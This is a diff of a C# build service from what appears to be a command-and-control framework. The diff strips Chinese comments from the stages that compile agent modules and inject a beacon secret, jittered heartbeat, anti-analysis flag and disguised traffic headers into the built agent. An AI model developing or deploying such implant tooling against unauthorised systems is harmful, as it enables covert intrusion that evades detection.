@@ -100,7 +100,6 @@ public partial class BuilderBuildService
     {
         job.Log($"=== Stage 1.6: Building cloud modules ({ctx.TargetTriple}) ===");
 
-        // 按构建配置的启用列表过滤（null/空 = 全部）
         var enabled = BuilderBuildService.EnabledModuleList(ctx);
         var enabledSet = new HashSet<string>(enabled);
         var targets = BuilderBuildService.CloudModules
@@ -109,8 +108,6 @@ public partial class BuilderBuildService
 
         var result = new ModuleBuildResult();
 
-        // 禁用/启用状态 = 文件名后缀：禁用 → {name}.{ext}.disable（保留，可恢复）；
-        // 启用 → 恢复为 {name}.{ext}。agent 请求原文件名，禁用后自然 404。
         if (Directory.Exists(ctx.ModulesDir))
         {
             foreach (var (moduleName, _) in BuilderBuildService.CloudModules)
@@ -142,8 +139,6 @@ public partial class BuilderBuildService
         var moduleBuildResult = await RunProcessAsync(BuilderBuildService.CargoExe(ctx), moduleBuildArgs, job, RustAgentDir, ctx.EnvVars);
         if (moduleBuildResult.ExitCode != 0)
         {
-            // 硬失败：编译/链接失败会连带阻塞其他模块部署（cargo 一条命令构建全部）。
-            // 之前静默 [WARN] 导致 Linux 平台全部模块缺失而构建仍标记 completed。
             job.Log($"[ERROR] cloud module build failed (exit {moduleBuildResult.ExitCode}) — modules not deployed: {string.Join(", ", targets.Select(t => t.Module))}");
             result.Compiled = false;
             result.Missing.AddRange(targets.Select(t => t.Module));
@@ -151,7 +146,6 @@ public partial class BuilderBuildService
         }
         result.Compiled = true;
 
-        // 部署在共享模块目录上：并发构建同平台时互斥（防交错写/改名）。
         lock (BuilderBuildService.BuildLock)
         {
             Directory.CreateDirectory(ctx.ModulesDir);
@@ -345,7 +339,6 @@ public partial class BuilderBuildService
         job.Log("=== Stage 4: Injecting Config ===");
         var req = ctx.Req;
 
-        // ── server_url：显式协议优先，否则按 host 前缀推断（缺省 http） ──
         var scheme = (req.ServerScheme ?? string.Empty).Trim().ToLowerInvariant();
         if (scheme != "http" && scheme != "https")
         {
@@ -358,7 +351,6 @@ public partial class BuilderBuildService
                   .TrimEnd('/');
         var serverUrl = $"{scheme}://{host}:{req.ServerPort}";
 
-        // ── 连接参数：null = 服务端默认；数值做 clamp 防脏数据 ──
         var (heartbeatMs, jitter) = ResolveConnectionTiming(req);
         var injectedConfig = new InjectedConfig
         {
@@ -376,11 +368,9 @@ public partial class BuilderBuildService
             core_key_path = ResolvePath(req.CoreKeyPath, "/api/v1/auth/token"),
             beacon_secret = _beaconSettings.Secret,
             anti_analysis = req.AntiAnalysis,
-            // 流量伪装（构建页面编辑注入；注册后服务端 profile 可覆盖）
             user_agents = req.UserAgents ?? new(),
             extra_headers = req.ExtraHeaders ?? new(),
             path_suffixes = req.PathSuffixes ?? new(),
-            // 服务端 RSA 公钥：注册/密钥协商混合加密
             server_public_key = _serverKeys.PublicKeyDerBase64,
         };
 
